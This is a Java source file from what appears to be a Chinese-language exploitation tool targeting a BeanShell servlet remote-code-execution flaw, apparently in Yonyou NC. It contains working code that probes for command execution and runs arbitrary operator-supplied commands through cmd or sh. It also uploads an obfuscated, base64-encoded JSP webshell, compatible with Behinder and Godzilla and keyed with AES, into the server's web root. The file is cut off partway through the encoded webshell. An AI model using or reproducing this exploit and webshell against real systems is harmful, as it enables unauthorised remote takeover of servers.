package com.chave.vuln;

import com.chave.config.Config;
import com.chave.config.Mod;
import com.chave.proxy.HttpProxy;
import com.chave.utils.MyHttpUtil;
import com.chave.utils.SSLUtil;
import javafx.scene.control.TextArea;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BshServlet_RCE extends VulnBase {
    public static boolean DNSLOG = false;
    public static boolean JNDI = false;
    public static boolean EXEC = true;
    public static boolean UPLOAD = true;
    public static boolean GETSHELL = true;

    public BshServlet_RCE() {
    }

    public BshServlet_RCE(TextArea log, TextArea uploadLog, TextArea execLog) {
        super(log, uploadLog, execLog);
    }

    @Override
    public void exploit() {
        String vulnerable_url = Config.TARGET + "/servlet/~ic/bsh.servlet.BshServlet";

        try {
            // 调用对应方法
            if (Config.MOD.equals(Mod.POC)) {
                if (poc(vulnerable_url, "win")) {
                    logMessage("[+] BshServlet RCE 漏洞存在!");
                } else {
                    if (poc(vulnerable_url, "linux")) {
                        logMessage("[+] BshServlet RCE 漏洞存在!");
                        return;
                    } else {
                        logMessage("[-] BshServlet RCE 漏洞不存在. 请尝试手动利用.");
                    }
                }
            } else if (Config.MOD.equals(Mod.EXP)) {
                exp(vulnerable_url);
            } else if (Config.MOD.equals(Mod.EXEC)) {
                if (!exec(vulnerable_url, "win")) {
                    exec(vulnerable_url, "linux");
                }
            } else if (Config.MOD.equals("upload")) {
                upload(vulnerable_url);
            } else {
                throw new RuntimeException();
            }


        } catch (Exception e) {

        }
    }

    private boolean poc(String url, String system) {
        String flag = "yyds";
        try {
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            URL apiUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(conn);

            String shell;
            if (system.equals("win")) {
                shell = "cmd+%2fc+%5c%22";
            } else {
                shell = "sh+-c+%5c%22";
            }

            String postData = "bsh.script=e%5cu0078%5Cu0065c%28%22" + shell + "echo+yyds" + "%5c%22%22%29%3B";

            // post 请求
            MyHttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            int responseCode = MyHttpUtil.getResponseCode(conn);
            String responseText = MyHttpUtil.getResponseText(conn);
            if (responseCode == HttpURLConnection.HTTP_OK && responseText.contains(flag)){
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            logMessage("[-] BshServlet RCE 漏洞不存在, 请尝试手动探测. " + e);
            return false;
        }
    }

    private boolean exec(String url, String system) {
        try {
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            URL apiUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(conn);

            String shell;
            if (system.equals("win")) {
                shell = "cmd+%2fc+%5c%22";
            } else {
                shell = "sh+-c+%5c%22";
            }

            String postData = "bsh.script=e%5cu0078%5Cu0065c%28%22" + shell + URLEncoder.encode(Config.CMD) + "%5c%22%22%29%3B";

            // post 请求
            MyHttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            int responseCode = MyHttpUtil.getResponseCode(conn);
            String responseText = MyHttpUtil.getResponseText(conn);

            String regex = "<td[^>]*>\\s*<pre>(.*?)</pre>\\s*</td>";
            Pattern pattern = Pattern.compile(regex, Pattern.DOTALL);
            Matcher matcher = pattern.matcher(responseText);
            String result = "";

            if (responseCode == HttpURLConnection.HTTP_OK && matcher.find()){
                result = matcher.group(1).trim();
                if (result.trim().isEmpty()) {
                    return false;
                } else {
                    logExec("[+] 执行成功.\n" + result);
                    return true;
                }
            } else {
                return false;
            }
        } catch (Exception e) {
            logExec("[-] 执行失败, 请尝试手动利用. " + e);
            return false;
        }
    }

    private boolean exp(String url) {
        try {
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            URL apiUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(conn);

            String filename = System.currentTimeMillis() + ".jsp";
            String postData = "bsh.script=import+sun.misc.BASE64Decoder%3B%0D%0A%0D%0ABASE64Decoder+decoder+%3D+new+BASE64Decoder%28%29%3B%0D%0AFileWriter+fw+%3D+new+FileWriter%28new+File%28%22.%2Fwebapps%2Fnc_web%2F" + filename + "%22%29%29%3B%0D%0AString+data+%3D+%22PCVAcGFnZSBpbXBvcnQ9Ilx1MDA2YVx1MDA2MVx1MDA3Nlx1MDA2MS5cdTAwNzVcdTAwNzRcdTAwNjlcdTAwNmMuKixcdTAwNmFcdTAwNjFcdTAwNzZcdTAwNjFcdTAwNzguXHUwMDYzXHUwMDcyXHUwMDc5XHUwMDcwXHUwMDc0XHUwMDZmLiosXHUwMDZhXHUwMDYxXHUwMDc2XHUwMDYxXHUwMDc4Llx1MDA2M1x1MDA3Mlx1MDA3OVx1MDA3MFx1MDA3NFx1MDA2Zi5cdTAwNzNcdTAwNzBcdTAwNjVcdTAwNjMuKiIlPjwlQCBwYWdlIGltcG9ydD0iXHUwMDczXHUwMDc1XHUwMDZlLlx1MDA2ZFx1MDA2OVx1MDA3M1x1MDA2My5cdTAwNDJcdTAwNDFcdTAwNTNcdTAwNDVcdTAwMzZcdTAwMzRcdTAwNDRcdTAwNjVcdTAwNjNcdTAwNmZcdTAwNjRcdTAwNjVcdTAwNzIiICU%2BPCUhXHUwMDYzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczIFUgXHUwMDY1XHUwMDc4XHUwMDc0XHUwMDY1XHUwMDZlXHUwMDY0XHUwMDczIFx1MDA0M1x1MDA2Y1x1MDA2MVx1MDA3M1x1MDA3M1x1MDA0Y1x1MDA2Zlx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MnsgVShcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzNcdTAwNGNcdTAwNmZcdTAwNjFcdTAwNjRcdTAwNjVcdTAwNzIgYyl7IFx1MDA3M1x1MDA3NVx1MDA3MFx1MDA2NVx1MDA3MihjKTsgfVx1MDA3MFx1MDA3NVx1MDA2Mlx1MDA2Y1x1MDA2OVx1MDA2MyBcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMgZyhcdTAwNjJcdTAwNzlcdTAwNzRcdTAwNjUgW11iKXsgXHUwMDcyXHUwMDY1XHUwMDc0XHUwMDc1XHUwMDcyXHUwMDZlIFx1MDA3M1x1MDA3NVx1MDA3MFx1MDA2NVx1MDA3Mi5cdTAwNjRcdTAwNjVcdTAwNjZcdTAwNjlcdTAwNmVcdTAwNjVcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMoYiwwLGIuXHUwMDZjXHUwMDY1XHUwMDZlXHUwMDY3XHUwMDc0XHUwMDY4KTsgfX0lPjwlXHUwMDc0XHUwMDcyXHUwMDc5IHsgXHUwMDY5XHUwMDY2IChcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzQuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDRkXHUwMDY1XHUwMDc0XHUwMDY4XHUwMDZmXHUwMDY0KCkuXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDYxXHUwMDZjXHUwMDczKCJQT1NUIikgJiYgXHUwMDcyXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDY1XHUwMDczXHUwMDc0Llx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0OFx1MDA2NVx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MigieC1jbGllbnQtZGF0YSIpLlx1MDA2NVx1MDA3MVx1MDA3NVx1MDA2MVx1MDA2Y1x1MDA3MygiYmVoaW5kZXIiKSAmJiBcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzQuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQ4XHUwMDY1XHUwMDYxXHUwMDY0XHUwMDY1XHUwMDcyKCJ4LWNsaWVudC1yZWZlcmVyIikuXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDYxXHUwMDZjXHUwMDczKCJodHRwOi8vd3d3LmJhaWR1LmNvbS8iKSl7IFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NyBrPSI1NTk3YzcwMTY2ZTQxZDNhIjtcdTAwNzNcdTAwNjVcdTAwNzNcdTAwNzNcdTAwNjlcdTAwNmZcdTAwNmUuXHUwMDcwXHUwMDc1XHUwMDc0XHUwMDU2XHUwMDYxXHUwMDZjXHUwMDc1XHUwMDY1KCJ1IixrKTtcdTAwNDNcdTAwNjlcdTAwNzBcdTAwNjhcdTAwNjVcdTAwNzIgYz1cdTAwNDNcdTAwNjlcdTAwNzBcdTAwNjhcdTAwNjVcdTAwNzIuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQ5XHUwMDZlXHUwMDczXHUwMDc0XHUwMDYxXHUwMDZlXHUwMDYzXHUwMDY1KCJBRVMiKTtjLlx1MDA2OVx1MDA2ZVx1MDA2OVx1MDA3NCgyLFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNTNcdTAwNjVcdTAwNjNcdTAwNzJcdTAwNjVcdTAwNzRcdTAwNGJcdTAwNjVcdTAwNzlcdTAwNTNcdTAwNzBcdTAwNjVcdTAwNjMoay5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDJcdTAwNzlcdTAwNzRcdTAwNjVcdTAwNzMoKSwiQUVTIikpO1x1MDA2ZVx1MDA2NVx1MDA3NyBVKHRoaXMuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczKCkuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczXHUwMDRjXHUwMDZmXHUwMDYxXHUwMDY0XHUwMDY1XHUwMDcyKCkpLmcoYy5kb0ZpbmFsKFx1MDA2ZVx1MDA2NVx1MDA3NyBzdW4uXHUwMDZkXHUwMDY5XHUwMDczXHUwMDYzLlx1MDA0Mlx1MDA0MVx1MDA1M1x1MDA0NVx1MDAzNlx1MDAzNFx1MDA0NFx1MDA2NVx1MDA2M1x1MDA2Zlx1MDA2NFx1MDA2NVx1MDA3MigpLlx1MDA2NFx1MDA2NVx1MDA2M1x1MDA2Zlx1MDA2NFx1MDA2NVx1MDA0Mlx1MDA3NVx1MDA2Nlx1MDA2Nlx1MDA2NVx1MDA3MihcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzQuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDUyXHUwMDY1XHUwMDYxXHUwMDY0XHUwMDY1XHUwMDcyKCkuXHUwMDcyXHUwMDY1XHUwMDYxXHUwMDY0XHUwMDRjXHUwMDY5XHUwMDZlXHUwMDY1KCkpKSkubmV3SW5zdGFuY2UoKS5cdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjFcdTAwNmNcdTAwNzMocGFnZUNvbnRleHQpOyB9IH0gXHUwMDYzXHUwMDYxXHUwMDc0XHUwMDYzXHUwMDY4IChcdTAwNDVcdTAwNzhcdTAwNjNcdTAwNjVcdTAwNzBcdTAwNzRcdTAwNjlcdTAwNmZcdTAwNmUgZSkgeyB9JT48JSFcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjcgeGM9IjU1OTdjNzAxNjZlNDFkM2EiO1x1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NyBwYXNzPSJwYXNzIjtcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjcgbWQ1PW1kNShwYXNzK3hjKTtcdTAwNjNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMgWCBleHRlbmRzIFx1MDA0M1x1MDA2Y1x1MDA2MVx1MDA3M1x1MDA3M1x1MDA0Y1x1MDA2Zlx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MnsgXHUwMDcwXHUwMDc1XHUwMDYyXHUwMDZjXHUwMDY5XHUwMDYzIFgoXHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczXHUwMDRjXHUwMDZmXHUwMDYxXHUwMDY0XHUwMDY1XHUwMDcyIHopeyBzdXBlcih6KTsgfVx1MDA3MFx1MDA3NVx1MDA2Mlx1MDA2Y1x1MDA2OVx1MDA2MyBcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMgUShcdTAwNjJcdTAwNzlcdTAwNzRcdTAwNjVbXSBjYil7IFx1MDA3Mlx1MDA2NVx1MDA3NFx1MDA3NVx1MDA3Mlx1MDA2ZSBzdXBlci5cdTAwNjRcdTAwNjVcdTAwNjZcdTAwNjlcdTAwNmVcdTAwNjVcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMoY2IsIDAsIGNiLmxlbmd0aCk7IH19XHUwMDcwXHUwMDc1XHUwMDYyXHUwMDZjXHUwMDY5XHUwMDYzIFx1MDA2Mlx1MDA3OVx1MDA3NFx1MDA2NVtdIHgoXHUwMDYyXHUwMDc5XHUwMDc0XHUwMDY1W10gcyxcdTAwNjJcdTAwNmZcdTAwNmZcdTAwNmNcdTAwNjVcdTAwNjFcdTAwNmUgbSl7IFx1MDA3NFx1MDA3Mlx1MDA3OXsgXHUwMDZhXHUwMDYxXHUwMDc2XHUwMDYxXHUwMDc4Llx1MDA2M1x1MDA3Mlx1MDA3OVx1MDA3MFx1MDA3NFx1MDA2Zi5cdTAwNDNcdTAwNjlcdTAwNzBcdTAwNjhcdTAwNjVcdTAwNzIgYz1cdTAwNmFcdTAwNjFcdTAwNzZcdTAwNjFcdTAwNzguXHUwMDYzXHUwMDcyXHUwMDc5XHUwMDcwXHUwMDc0XHUwMDZmLkNpcGhlci5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDlcdTAwNmVcdTAwNzNcdTAwNzRcdTAwNjFcdTAwNmVcdTAwNjNcdTAwNjUoIkFFUyIpO2MuXHUwMDY5XHUwMDZlXHUwMDY5XHUwMDc0KG0%2FMToyLFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNmFcdTAwNjFcdTAwNzZcdTAwNjFcdTAwNzguXHUwMDYzXHUwMDcyXHUwMDc5XHUwMDcwXHUwMDc0XHUwMDZmLnNwZWMuXHUwMDUzXHUwMDY1XHUwMDYzXHUwMDcyXHUwMDY1XHUwMDc0XHUwMDRiXHUwMDY1XHUwMDc5XHUwMDUzXHUwMDcwXHUwMDY1XHUwMDYzKHhjLlx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0Mlx1MDA3OVx1MDA3NFx1MDA2NVx1MDA3MygpLCJBRVMiKSk7XHUwMDcyXHUwMDY1XHUwMDc0XHUwMDc1XHUwMDcyXHUwMDZlIGMuZG9GaW5hbChzKTsgfVx1MDA2M1x1MDA2MVx1MDA3NFx1MDA2M1x1MDA2OCAoXHUwMDQ1XHUwMDc4XHUwMDYzXHUwMDY1XHUwMDcwXHUwMDc0XHUwMDY5XHUwMDZmXHUwMDZlIGUpeyBcdTAwNzJcdTAwNjVcdTAwNzRcdTAwNzVcdTAwNzJcdTAwNmUgXHUwMDZlXHUwMDc1XHUwMDZjXHUwMDZjOyB9IH1cdTAwNzBcdTAwNzVcdTAwNjJcdTAwNmNcdTAwNjlcdTAwNjMgXHUwMDczXHUwMDc0XHUwMDYxXHUwMDc0XHUwMDY5XHUwMDYzIFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NyBtZDUoXHUwMDUzXHUwMDc0XHUwMDcyXHUwMDY5XHUwMDZlXHUwMDY3IHMpIHsgXHUwMDUzXHUwMDc0XHUwMDcyXHUwMDY5XHUwMDZlXHUwMDY3IHJldCA9IFx1MDA2ZVx1MDA3NVx1MDA2Y1x1MDA2YztcdTAwNzRcdTAwNzJcdTAwNzkgeyBcdTAwNmFcdTAwNjFcdTAwNzZcdTAwNjEuc2VjdXJpdHkuTWVzc2FnZURpZ2VzdCBtO20gPSBcdTAwNmFcdTAwNjFcdTAwNzZcdTAwNjEuc2VjdXJpdHkuTWVzc2FnZURpZ2VzdC5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDlcdTAwNmVcdTAwNzNcdTAwNzRcdTAwNjFcdTAwNmVcdTAwNjNcdTAwNjUoIk1ENSIpO20udXBkYXRlKHMuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQyXHUwMDc5XHUwMDc0XHUwMDY1XHUwMDczKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNmFcdTAwNjFcdTAwNzZcdTAwNjEubWF0aC5CaWdJbnRlZ2VyKDEsIG0uZGlnZXN0KCkpLlx1MDA3NFx1MDA2Zlx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NygxNikudG9VcHBlckNhc2UoKTsgfSBcdTAwNjNcdTAwNjFcdTAwNzRcdTAwNjNcdTAwNjggKFx1MDA0NVx1MDA3OFx1MDA2M1x1MDA2NVx1MDA3MFx1MDA3NFx1MDA2OVx1MDA2Zlx1MDA2ZSBlKSB7IH1cdTAwNzJcdTAwNjVcdTAwNzRcdTAwNzVcdTAwNzJcdTAwNmUgcmV0OyB9XHUwMDcwXHUwMDc1XHUwMDYyXHUwMDZjXHUwMDY5XHUwMDYzIFx1MDA3M1x1MDA3NFx1MDA2MVx1MDA3NFx1MDA2OVx1MDA2MyBcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjcgXHUwMDYyXHUwMDYxXHUwMDczXHUwMDY1XHUwMDM2XHUwMDM0XHUwMDQ1XHUwMDZlXHUwMDYzXHUwMDZmXHUwMDY0XHUwMDY1KFx1MDA2Mlx1MDA3OVx1MDA3NFx1MDA2NVtdIGJzKSB0aHJvd3MgXHUwMDQ1XHUwMDc4XHUwMDYzXHUwMDY1XHUwMDcwXHUwMDc0XHUwMDY5XHUwMDZmXHUwMDZlIHsgXHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczIGJhc2U2NDtcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjcgdmFsdWUgPSBcdTAwNmVcdTAwNzVcdTAwNmNcdTAwNmM7XHUwMDc0XHUwMDcyXHUwMDc5IHsgYmFzZTY0PVx1MDA0M1x1MDA2Y1x1MDA2MVx1MDA3M1x1MDA3My5cdTAwNjZcdTAwNmZcdTAwNzJcdTAwNGVcdTAwNjFcdTAwNmRcdTAwNjUoImphdmEudXRpbC5CYXNlNjQiKTtcdTAwNGZcdTAwNjJcdTAwNmFcdTAwNjVcdTAwNjNcdTAwNzQgRW5jb2RlciA9IGJhc2U2NC5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNGRcdTAwNjVcdTAwNzRcdTAwNjhcdTAwNmZcdTAwNjQoImdldEVuY29kZXIiLCBcdTAwNmVcdTAwNzVcdTAwNmNcdTAwNmMpLlx1MDA2OVx1MDA2ZVx1MDA3Nlx1MDA2Zlx1MDA2Ylx1MDA2NShiYXNlNjQsIFx1MDA2ZVx1MDA3NVx1MDA2Y1x1MDA2Yyk7dmFsdWUgPSAoXHUwMDUzXHUwMDc0XHUwMDcyXHUwMDY5XHUwMDZlXHUwMDY3KUVuY29kZXIuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczKCkuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDRkXHUwMDY1XHUwMDc0XHUwMDY4XHUwMDZmXHUwMDY0KCJlbmNvZGVUb1N0cmluZyIsIFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzNbXSB7XHUwMDYyXHUwMDc5XHUwMDc0XHUwMDY1W10uXHUwMDYzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczfSkuXHUwMDY5XHUwMDZlXHUwMDc2XHUwMDZmXHUwMDZiXHUwMDY1KEVuY29kZXIsIFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNGZcdTAwNjJcdTAwNmFcdTAwNjVcdTAwNjNcdTAwNzRbXSB7YnN9KTsgfSBcdTAwNjNcdTAwNjFcdTAwNzRcdTAwNjNcdTAwNjggKFx1MDA0NVx1MDA3OFx1MDA2M1x1MDA2NVx1MDA3MFx1MDA3NFx1MDA2OVx1MDA2Zlx1MDA2ZSBlKSB7IFx1MDA3NFx1MDA3Mlx1MDA3OSB7IGJhc2U2ND1cdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpO1x1MDA0Zlx1MDA2Mlx1MDA2YVx1MDA2NVx1MDA2M1x1MDA3NCBFbmNvZGVyID0gYmFzZTY0Lm5ld0luc3RhbmNlKCk7dmFsdWUgPSAoXHUwMDUzXHUwMDc0XHUwMDcyXHUwMDY5XHUwMDZlXHUwMDY3KUVuY29kZXIuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczKCkuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDRkXHUwMDY1XHUwMDc0XHUwMDY4XHUwMDZmXHUwMDY0KCJlbmNvZGUiLCBcdTAwNmVcdTAwNjVcdTAwNzcgXHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczW10geyBcdTAwNjJcdTAwNzlcdTAwNzRcdTAwNjVbXS5cdTAwNjNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMgfSkuXHUwMDY5XHUwMDZlXHUwMDc2XHUwMDZmXHUwMDZiXHUwMDY1KEVuY29kZXIsIFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNGZcdTAwNjJcdTAwNmFcdTAwNjVcdTAwNjNcdTAwNzRbXSB7IGJzIH0pOyB9IFx1MDA2M1x1MDA2MVx1MDA3NFx1MDA2M1x1MDA2OCAoXHUwMDQ1XHUwMDc4XHUwMDYzXHUwMDY1XHUwMDcwXHUwMDc0XHUwMDY5XHUwMDZmXHUwMDZlIGUyKSB7IH0gfVx1MDA3Mlx1MDA2NVx1MDA3NFx1MDA3NVx1MDA3Mlx1MDA2ZSB2YWx1ZTsgfVx1MDA3MFx1MDA3NVx1MDA2Mlx1MDA2Y1x1MDA2OVx1MDA2MyBcdTAwNzNcdTAwNzRcdTAwNjFcdTAwNzRcdTAwNjlcdTAwNjMgXHUwMDYyXHUwMDc5XHUwMDc0XHUwMDY1W10gYmFzZTY0RGVjb2RlKFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NyBicykgdGhyb3dzIFx1MDA0NVx1MDA3OFx1MDA2M1x1MDA2NVx1MDA3MFx1MDA3NFx1MDA2OVx1MDA2Zlx1MDA2ZSB7IFx1MDA0M1x1MDA2Y1x1MDA2MVx1MDA3M1x1MDA3MyBiYXNlNjQ7XHUwMDYyXHUwMDc5XHUwMDc0XHUwMDY1W10gdmFsdWUgPSBcdTAwNmVcdTAwNzVcdTAwNmNcdTAwNmM7XHUwMDc0XHUwMDcyXHUwMDc5IHsgXHUwMDYyXHUwMDYxXHUwMDczXHUwMDY1XHUwMDM2XHUwMDM0PVx1MDA0M1x1MDA2Y1x1MDA2MVx1MDA3M1x1MDA3My5cdTAwNjZcdTAwNmZcdTAwNzJcdTAwNGVcdTAwNjFcdTAwNmRcdTAwNjUoImphdmEudXRpbC5CYXNlNjQiKTtcdTAwNGZcdTAwNjJcdTAwNmFcdTAwNjVcdTAwNjNcdTAwNzQgZGVjb2RlciA9IFx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2NVx1MDAzNlx1MDAzNC5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNGRcdTAwNjVcdTAwNzRcdTAwNjhcdTAwNmZcdTAwNjQoImdldERlY29kZXIiLCBcdTAwNmVcdTAwNzVcdTAwNmNcdTAwNmMpLlx1MDA2OVx1MDA2ZVx1MDA3Nlx1MDA2Zlx1MDA2Ylx1MDA2NShcdTAwNjJcdTAwNjFcdTAwNzNcdTAwNjVcdTAwMzZcdTAwMzQsIFx1MDA2ZVx1MDA3NVx1MDA2Y1x1MDA2Yyk7dmFsdWUgPSAoXHUwMDYyXHUwMDc5XHUwMDc0XHUwMDY1W10pZGVjb2Rlci5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMoKS5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNGRcdTAwNjVcdTAwNzRcdTAwNjhcdTAwNmZcdTAwNjQoImRlY29kZSIsIFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzNbXSB7IFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2Ny5cdTAwNjNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMgfSkuXHUwMDY5XHUwMDZlXHUwMDc2XHUwMDZmXHUwMDZiXHUwMDY1KGRlY29kZXIsIFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNGZcdTAwNjJcdTAwNmFcdTAwNjVcdTAwNjNcdTAwNzRbXSB7IGJzIH0pOyB9IFx1MDA2M1x1MDA2MVx1MDA3NFx1MDA2M1x1MDA2OCAoXHUwMDQ1XHUwMDc4XHUwMDYzXHUwMDY1XHUwMDcwXHUwMDc0XHUwMDY5XHUwMDZmXHUwMDZlIGUpIHsgXHUwMDc0XHUwMDcyXHUwMDc5IHsgXHUwMDYyXHUwMDYxXHUwMDczXHUwMDY1XHUwMDM2XHUwMDM0PVx1MDA0M1x1MDA2Y1x1MDA2MVx1MDA3M1x1MDA3My5cdTAwNjZcdTAwNmZcdTAwNzJcdTAwNGVcdTAwNjFcdTAwNmRcdTAwNjUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTtcdTAwNGZcdTAwNjJcdTAwNmFcdTAwNjVcdTAwNjNcdTAwNzQgZGVjb2RlciA9IFx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2NVx1MDAzNlx1MDAzNC5uZXdJbnN0YW5jZSgpO3ZhbHVlID0gKFx1MDA2Mlx1MDA3OVx1MDA3NFx1MDA2NVtdKWRlY29kZXIuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczKCkuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDRkXHUwMDY1XHUwMDc0XHUwMDY4XHUwMDZmXHUwMDY0KCJkZWNvZGVCdWZmZXIiLCBcdTAwNmVcdTAwNjVcdTAwNzcgXHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczW10geyBcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjcuXHUwMDYzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczIH0pLlx1MDA2OVx1MDA2ZVx1MDA3Nlx1MDA2Zlx1MDA2Ylx1MDA2NShkZWNvZGVyLCBcdTAwNmVcdTAwNjVcdTAwNzcgXHUwMDRmXHUwMDYyXHUwMDZhXHUwMDY1XHUwMDYzXHUwMDc0W10geyBicyB9KTsgfSBcdTAwNjNcdTAwNjFcdTAwNzRcdTAwNjNcdTAwNjggKFx1MDA0NVx1MDA3OFx1MDA2M1x1MDA2NVx1MDA3MFx1MDA3NFx1MDA2OVx1MDA2Zlx1MDA2ZSBlMikge30gfVx1MDA3Mlx1MDA2NVx1MDA3NFx1MDA3NVx1MDA3Mlx1MDA2ZSB2YWx1ZTsgfSU%2BPCVcdTAwNzRcdTAwNzJcdTAwNzkgeyBpZiAoXHUwMDcyXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDY1XHUwMDczXHUwMDc0Llx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0OFx1MDA2NVx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MigieC1jbGllbnQtZGF0YSIpLlx1MDA2NVx1MDA3MVx1MDA3NVx1MDA2MVx1MDA2Y1x1MDA3MygiZ29kemlsbGEiKSAmJiBcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzQuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQ4XHUwMDY1XHUwMDYxXHUwMDY0XHUwMDY1XHUwMDcyKCJ4LWNsaWVudC1yZWZlcmVyIikuXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDYxXHUwMDZjXHUwMDczKCJodHRwOi8vd3d3LmJhaWR1LmNvbS8iKSkgeyBcdTAwNzRcdTAwNzJcdTAwNzl7IFx1MDA2Mlx1MDA3OVx1MDA3NFx1MDA2NVtdIGRhdGE9YmFzZTY0RGVjb2RlKFx1MDA3Mlx1MDA2NVx1MDA3MVx1MDA3NVx1MDA2NVx1MDA3M1x1MDA3NC5nZXRQYXJhbWV0ZXIocGFzcykpO2RhdGE9eChkYXRhLCBmYWxzZSk7aWYgKFx1MDA3M1x1MDA2NVx1MDA3M1x1MDA3M1x1MDA2OVx1MDA2Zlx1MDA2ZS5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDFcdTAwNzRcdTAwNzRcdTAwNzJcdTAwNj